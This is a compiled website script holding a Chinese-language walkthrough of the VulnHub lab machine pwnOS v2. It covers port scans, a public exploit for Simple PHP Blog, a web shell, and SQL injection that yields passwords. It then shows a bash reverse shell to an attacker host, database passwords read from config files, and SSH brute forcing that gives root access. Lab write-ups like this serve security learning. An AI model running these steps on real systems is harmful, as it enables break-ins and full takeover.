"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6574],{6493:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>a,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/pwnosv2","title":"pwnosv2","description":"\u6dfb\u52a0\u7f51\u5361\uff0c\u4fee\u6539IP","source":"@site/docs/VulnHub/Virtual Machines/pwnosv2.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/pwnosv2","permalink":"/docs/VulnHub/Virtual Machines/pwnosv2","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/pwnosv2.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"pwnlab_init","permalink":"/docs/VulnHub/Virtual Machines/pwnlab_init"},"next":{"title":"scream","permalink":"/docs/VulnHub/Virtual Machines/scream"}}');var t=r(4848),i=r(8453);const o={},l=void 0,a={},c=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"reverse shell",id:"reverse-shell",level:2},{value:"SSH",id:"ssh",level:2}];function p(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.p,{children:"\u6dfb\u52a0\u7f51\u5361\uff0c\u4fee\u6539IP"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112170938395.png",alt:"image-20241112170938395"})}),"\n",(0,t.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,t.jsx)(e.p,{children:"TCP Scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Mon Nov 11 08:45:16 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 10.10.10.100\r\nNmap scan report for 10.10.10.100\r\nHost is up (0.0025s latency).\r\nNot shown: 65533 filtered tcp ports (no-response)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\n# Nmap done at Mon Nov 11 08:45:43 2024 -- 1 IP address (1 host up) scanned in 26.49 seconds\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Mon Nov 11 08:48:25 2024 as: nmap -sT -sV -sC -O -p22,80 -oN nmap_results/detils_scan 10.10.10.100\r\nNmap scan report for 10.10.10.100\r\nHost is up (0.0012s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)\r\n|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)\r\n|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)\r\n80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))\r\n| http-cookie-flags: \r\n|   /: \r\n|     PHPSESSID: \r\n|_      httponly flag not set\r\n|_http-server-header: Apache/2.2.17 (Ubuntu)\r\n|_http-title: Welcome to this Site!\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: WAP|general purpose\r\nRunning: Actiontec embedded, Linux 2.4.X\r\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37\r\nOS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(e.p,{children:"UDP Scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Mon Nov 11 08:47:32 2024 as: nmap -sU --min-rate 10000 -p- -oN nmap_results/udp_scan 10.10.10.100\r\nNmap scan report for 10.10.10.100\r\nHost is up (0.00047s latency).\r\nAll 65535 scanned ports on 10.10.10.100 are in ignored states.\r\nNot shown: 65535 open|filtered udp ports (no-response)\n"})}),"\n",(0,t.jsx)(e.p,{children:"vuln scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Mon Nov 11 08:49:16 2024 as: nmap --script=vuln -p22,80 -oN nmap_results/script_scan 10.10.10.100\r\nNmap scan report for 10.10.10.100\r\nHost is up (0.00050s latency).\r\n\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\r\n| http-csrf: \r\n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.100\r\n|   Found the following possible CSRF vulnerabilities: \r\n|     \r\n|     Path: http://10.10.10.100:80/register.php\r\n|     Form id: \r\n|     Form action: register.php\r\n|     \r\n|     Path: http://10.10.10.100:80/login.php\r\n|     Form id: \r\n|_    Form action: login.php\r\n|_http-dombased-xss: Couldn't find any DOM based XSS.\r\n| http-cookie-flags: \r\n|   /: \r\n|     PHPSESSID: \r\n|       httponly flag not set\r\n|   /login.php: \r\n|     PHPSESSID: \r\n|       httponly flag not set\r\n|   /login/: \r\n|     PHPSESSID: \r\n|       httponly flag not set\r\n|   /index/: \r\n|     PHPSESSID: \r\n|       httponly flag not set\r\n|   /register/: \r\n|     PHPSESSID: \r\n|_      httponly flag not set\r\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\r\n| http-enum: \r\n|   /blog/: Blog\r\n|   /login.php: Possible admin folder\r\n|   /login/: Login page\r\n|   /info.php: Possible information file\r\n|   /icons/: Potentially interesting folder w/ directory listing\r\n|   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'\r\n|   /index/: Potentially interesting folder\r\n|   /info/: Potentially interesting folder\r\n|_  /register/: Potentially interesting folder\n"})}),"\n",(0,t.jsx)(e.p,{children:"SSH\u6ca1\u4ec0\u4e48\u6f0f\u6d1e"}),"\n",(0,t.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,t.jsxs)(e.p,{children:["\u4e3b\u9875\u662f\u4e00\u4e2a\u7ad9\uff0c",(0,t.jsx)(e.code,{children:"/blog"}),"\u662f\u4e00\u4e2a\u7ad9"]}),"\n",(0,t.jsx)(e.p,{children:"\u9996\u5148\u6307\u7eb9\u8bc6\u522b"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112171736796.png",alt:"image-20241112171736796"})}),"\n",(0,t.jsxs)(e.p,{children:["blog\u7ad9\u70b9\u662f",(0,t.jsx)(e.code,{children:"Simple PHP Blog 0.4.0"}),"\uff0c\u4ed4\u7ec6\u770b\u6e90\u7801\u4e5f\u53ef\u4ee5\u770b\u5230"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112171853065.png",alt:"image-20241112171853065"})}),"\n",(0,t.jsx)(e.p,{children:"\u627e\u4e00\u4e0b\u5386\u53f2\u6f0f\u6d1e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"searchsploit Simple PHP Blog 0.4.0\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172014427.png",alt:"image-20241112172014427"})}),"\n",(0,t.jsxs)(e.p,{children:["\u4f7f\u7528",(0,t.jsx)(e.code,{children:"1191.pl"}),"\u5c1d\u8bd5"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172243980.png",alt:"image-20241112172243980"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"./1191.pl -h http://10.10.10.100/blog -e 2\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"./1191.pl -h http://10.10.10.100/blog -e 1\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u4e0a\u4f20",(0,t.jsx)(e.code,{children:"webshell"}),"\uff0c\u6216\u8005\u4f7f\u75283\u9009\u9879\uff0c\u751f\u6210\u767b\u5f55\u8d26\u53f7\u5bc6\u7801\uff0c\u540e\u53f0\u6709\u4e2a\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172440194.png",alt:"image-20241112172440194"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://10.10.10.100/blog/images/cmd.php?cmd=id",children:"http://10.10.10.100/blog/images/cmd.php?cmd=id"})}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u6210\u529f\u6267\u884c\u547d\u4ee4"}),"\n",(0,t.jsx)(e.p,{children:"\u5982\u679c\u62a5\u9519\uff0c\u5c1d\u8bd5\u5b89\u88c5\u4f9d\u8d56"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"apt install libswitch-perl\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5173\u4e8e\u5154\u5b50\u6d1e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-http",children:"POST /login.php HTTP/1.1\r\nHost: 10.10.10.100\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nOrigin: http://10.10.10.100\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\r\nReferer: http://10.10.10.100/login.php\r\nCache-Control: max-age=0\r\nAccept-Language: zh-CN,zh;q=0.9\r\nContent-Type: application/x-www-form-urlencoded\r\nUpgrade-Insecure-Requests: 1\r\nCookie: PHPSESSID=ba88e12vnq70i44k3qcjr675n5\r\nContent-Length: 60\r\n\r\nemail=adminqq%40qq.com&pass=1111&submit=Login&submitted=TRUE\n"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"email"}),"\u5904\u5b58\u5728sql\u6ce8\u5165"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172822344.png",alt:"image-20241112172822344"})}),"\n",(0,t.jsxs)(e.p,{children:["\u62ff\u5230\u5bc6\u7801\uff1a",(0,t.jsx)(e.code,{children:"admin@isints.com:killerbeesareflying"}),"\uff0c\u767b\u5f55\u540e\u53f0"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241112172951088.png",alt:"image-20241112172951088"})}),"\n",(0,t.jsx)(e.h2,{id:"reverse-shell",children:"reverse shell"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"bash -c 'bash -i >& /dev/tcp/10.10.10.1/1234 0>&1\n"})}),"\n",(0,t.jsx)(e.h2,{id:"ssh",children:"SSH"}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"sudo"}),"\uff0c",(0,t.jsx)(e.code,{children:"suid"}),"\uff0c\u5b9a\u65f6\u4efb\u52a1\u6ca1\u6709"]}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"passwd"}),"\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"root:x:0:0:root:/root:/bin/bash\r\ndan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fd9\u4e24\u7528\u6237\u53ef\u4ee5\u5229\u7528"}),"\n",(0,t.jsx)(e.p,{children:"\u67e5\u770b\u7aef\u53e3\u5f00\u653e\u60c5\u51b5"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"www-data@web:/var/www/blog/images$ netstat -lntp\r\nnetstat -lntp\r\n(Not all processes could be identified, non-owned process info\r\n will not be shown, you would have to be root to see it all.)\r\nActive Internet connections (only servers)\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\r\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\r\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\r\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\r\ntcp6       0      0 :::22                   :::*                    LISTEN      -\n"})}),"\n",(0,t.jsx)(e.p,{children:"3306\u7aef\u53e3\u5f00\u653e\uff0c\u53ef\u4ee5\u627e\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"www-data@web:/var/www$ cat mysqli_connect.php\r\ncat mysqli_connect.php\r\n<?php # Script 8.2 - mysqli_connect.php\r\n\r\nDEFINE ('DB_USER', 'root');\r\nDEFINE ('DB_PASSWORD', 'goodday');\r\nDEFINE ('DB_HOST', 'localhost');\r\nDEFINE ('DB_NAME', 'ch16');\r\n\r\nwww-data@web:/var$ cat mysqli_connect.php\r\ncat mysqli_connect.php\r\n<?php # Script 8.2 - mysqli_connect.php\r\n\r\nDEFINE ('DB_USER', 'root');\r\nDEFINE ('DB_PASSWORD', 'root@ISIntS');\r\nDEFINE ('DB_HOST', 'localhost');\r\nDEFINE ('DB_NAME', 'ch16');\n"})}),"\n",(0,t.jsx)(e.p,{children:"user list"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"root"}),"\n",(0,t.jsx)(e.p,{children:"dan"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"pass list"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"goodday"}),"\n",(0,t.jsx)(e.p,{children:"root@ISIntS"}),"\n",(0,t.jsx)(e.p,{children:"killerbeesareflying"}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"www-data@web:/var/www/blog$ mysql -uroot -proot@ISIntS\r\nmysql -uroot -proot@ISIntS\r\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\r\nYour MySQL connection id is 216\r\nServer version: 5.1.54-1ubuntu4 (Ubuntu)\r\n\r\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\r\nThis software comes with ABSOLUTELY NO WARRANTY. This is free software,\r\nand you are welcome to modify and redistribute it under the GPL v2 license\r\n\r\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\r\n\r\nmysql>\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u7136\u540e\uff0c\u5229\u7528",(0,t.jsx)(e.code,{children:"crackmapexec"}),"\u5de5\u5177\u7206\u7834SSH"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"crackmapexec ssh 10.10.10.100 -u user.list -p pass.list\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"SSH         10.10.10.100    22     10.10.10.100     [*] SSH-2.0-OpenSSH_5.8p1 Debian-1ubuntu3\r\nSSH         10.10.10.100    22     10.10.10.100     [-] root:goodday Authentication failed.\r\nSSH         10.10.10.100    22     10.10.10.100     [+] root:root@ISIntS (Pwn3d!)\n"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"root:root@ISIntS"}),"\u6210\u529f"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"ssh root@10.10.10.100\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@web:~# id\r\nuid=0(root) gid=0(root) groups=0(root)\r\nroot@web:~# whoami\r\nroot\r\nroot@web:~# ifconfig\r\neth0      Link encap:Ethernet  HWaddr 00:0c:29:39:86:a2  \r\n          inet addr:10.10.10.100  Bcast:10.10.10.255  Mask:255.255.255.0\r\n          inet6 addr: fe80::20c:29ff:fe39:86a2/64 Scope:Link\r\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\r\n          RX packets:3266 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:2815 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000 \r\n          RX bytes:545528 (545.5 KB)  TX bytes:610881 (610.8 KB)\r\n\r\nlo        Link encap:Local Loopback  \r\n          inet addr:127.0.0.1  Mask:255.0.0.0\r\n          inet6 addr: ::1/128 Scope:Host\r\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\r\n          RX packets:58 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:58 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0 \r\n          RX bytes:5312 (5.3 KB)  TX bytes:5312 (5.3 KB)\r\n\r\nroot@web:~# uname -a\r\nLinux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux\n"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(p,{...n})}):p(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>o,x:()=>l});var s=r(6540);const t={},i=s.createContext(t);function o(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:o(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);